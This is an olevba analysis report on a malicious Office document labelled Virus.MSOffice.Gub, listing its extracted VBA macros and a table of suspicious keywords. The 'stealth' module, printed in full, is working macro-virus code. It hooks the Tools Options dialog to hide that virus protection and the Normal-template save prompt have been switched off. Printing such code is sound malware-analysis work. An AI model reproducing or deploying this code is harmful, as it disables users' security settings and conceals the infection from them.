olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSOffice.Gub-6aa1ef49018c407813b0a29d6c9f948aaf5ca368
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: Virus.MSOffice.Gub-6aa1ef49018c407813b0a29d6c9f948aaf5ca368 - OLE stream: '_VBA_PROJECT_CUR/VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet1.cls 
in file: Virus.MSOffice.Gub-6aa1ef49018c407813b0a29d6c9f948aaf5ca368 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet2.cls 
in file: Virus.MSOffice.Gub-6aa1ef49018c407813b0a29d6c9f948aaf5ca368 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet3.cls 
in file: Virus.MSOffice.Gub-6aa1ef49018c407813b0a29d6c9f948aaf5ca368 - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet3'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO stealth.bas 
in file: Virus.MSOffice.Gub-6aa1ef49018c407813b0a29d6c9f948aaf5ca368 - OLE stream: '_VBA_PROJECT_CUR/VBA/stealth'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub ToolsOptions()
'by VOVAN//SMF
On Error Resume Next
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", Application.UserName) And System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", Application.UserName & "!") Then GoTo 1
If Options.VirusProtection = 1 Then System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", Application.UserName) = "Yes" Else System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", Application.UserName) = "No"
If Options.SaveNormalPrompt = 1 Then System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", Application.UserName & "!") = "Yes" Else System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", Application.UserName & "!") = "No"
1: If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", Application.UserName) = "Yes" Then Options.VirusProtection = 1 Else Options.VirusProtection = 0
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", Application.UserName & "!") = "Yes" Then Options.SaveNormalPrompt = 1 Else Options.SaveNormalPrompt = 0
If Dialogs(wdDialogToolsOptions).Show >= 0 Then
Exit Sub
End If
If Options.VirusProtection = True Then System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", Application.UserName) = "Yes" Else System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", Application.UserName) = "No"
If Options.SaveNormalPrompt = True Then System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", Application.UserName & "!") = "Yes" Else System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", Application.UserName & "!") = "No"
Options.VirusProtection = 0
Options.SaveNormalPrompt = 0
End Sub
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Sheet
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

